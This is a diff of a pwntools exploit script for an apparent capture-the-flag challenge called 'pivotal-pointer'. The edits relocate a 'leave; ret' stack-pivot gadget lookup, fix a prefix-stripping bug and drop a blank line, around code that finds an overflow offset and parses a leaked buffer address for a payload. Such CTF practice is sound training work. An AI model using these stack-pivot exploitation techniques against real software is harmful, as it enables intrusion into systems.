@@ -4,7 +4,6 @@ import pwn
 
 pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])
 
-
 def tee[T: pwn.tube](process: T) -> T:
     import sys
 
@@ -42,7 +41,7 @@ def find_offset():
     import shutil
 
     bin = find_challenge()
-    tmp = f"/tmp/{bin.lstrip('/challenge/')}"
+    tmp = f"/tmp/{bin.removeprefix('/challenge/')}"
     shutil.copy2(bin, tmp)
     io = pwn.process(tmp, level="error")
     io.sendline(pwn.cyclic(256))
@@ -57,6 +56,9 @@ def ctf():
     # pivotal-pointer
     bin = find_challenge()
     elf = pwn.ELF(bin, checksec=False)
+
+    rop = pwn.ROP(elf)
+    ins = rop.find_gadget(["leave", "ret"]).address
 
     offset = find_offset()
 
@@ -77,9 +79,6 @@ def ctf():
         if not (m := re.match(rb"(0x[0-9a-fA-F]+)\.", io.recvline())):
             raise ValueError("failed to parse input buffer address")
         buff_ptr = int(m.group(1), 16)
-
-        rop = pwn.ROP(elf)
-        ins = rop.find_gadget(["leave", "ret"]).address
 
         payload = pwn.flat(
             {
